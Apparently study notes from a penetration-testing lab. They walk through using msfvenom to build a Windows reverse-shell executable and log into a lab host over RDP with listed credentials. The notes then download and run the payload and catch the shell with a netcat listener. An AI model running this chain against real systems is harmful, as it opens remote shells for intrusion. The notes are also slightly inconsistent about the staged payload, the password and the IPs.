@@ -1,0 +1,16 @@
+Questions 1
+Follow the steps from this section and use msfvenom to create a Windows binary with a staged TCP reverse shell payload. Start a multi/handler within Metasploit to receive the staged reverse shell from VM #1 once you execute the executable file on the system. Enter the command to list all payloads of msfvenom.
+
+msfvenom -l payloads --platform windows --arch x64
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.166 LPORT=443 -f exe -o nonstaged.exe
+
+# Now that we have created the malicious binary file, let's use it. For this, we start a Netcat listener on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with user justin and password SuperS3cure1337#. Once we've connected over RDP, we can start PowerShell to transfer the file and execute it.
+
+xfreerdp /u:justin /p:SuperS3cure1337 /v:192.168.217.202 /drive:/home/kali/Desktop,smb_share
+
+PS C:\Users\justin> iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
+PS C:\Users\justin> .\nonstaged.exe
+
+# On KALI machine
+nc -lvnp 443
+
